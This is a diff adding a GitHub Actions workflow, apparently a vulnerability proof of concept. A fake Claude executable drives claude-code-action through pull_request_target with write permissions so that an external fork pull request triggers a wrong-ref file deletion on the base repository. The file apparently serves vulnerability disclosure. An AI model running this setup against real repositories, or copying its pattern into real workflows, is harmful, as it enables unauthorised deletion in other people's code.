@@ -1,0 +1,44 @@
+name: Claude Hash Ref E2E PoC (delete_files variant)
+
+# Third E2E variant. Uses the same vulnerable primitive but exercises it
+# through delete_files, showing that an external fork PR can drive a
+# wrong-ref *deletion* on the base repository, not only a wrong-ref
+# write. The deletion runs against the same BRANCH_NAME env and the
+# same unencoded /git/refs/heads/${branch} URL construction.
+#
+# Set POC_DELETE_TARGET in the workflow env to name a target path that
+# exists on base main. README.md is used by default because it is the
+# safest example to include in a PoC repo.
+
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  issues: write
+
+jobs:
+  e2e-delete:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    env:
+      POC_DELETE_TARGET: e2e-action-marker.txt
+    steps:
+      - name: Checkout base repository
+        uses: actions/checkout@v6
+
+      - name: Mark fake Claude executable
+        run: chmod +x .github/fake-claude-delete-variant.mjs
+
+      - name: Run vulnerable Claude Code Action path (delete variant)
+        uses: anthropics/claude-code-action@6c0083bb7289c31716797a039b6367b3079cc46e
+        with:
+          prompt: "PoC: delete files using commit signing."
+          anthropic_api_key: "fake-key-not-used-by-fake-claude"
+          github_token: ${{ github.token }}
+          allowed_non_write_users: "s0kex"
+          use_commit_signing: true
+          path_to_claude_code_executable: ${{ github.workspace }}/.github/fake-claude-delete-variant.mjs
+          show_full_output: "true"
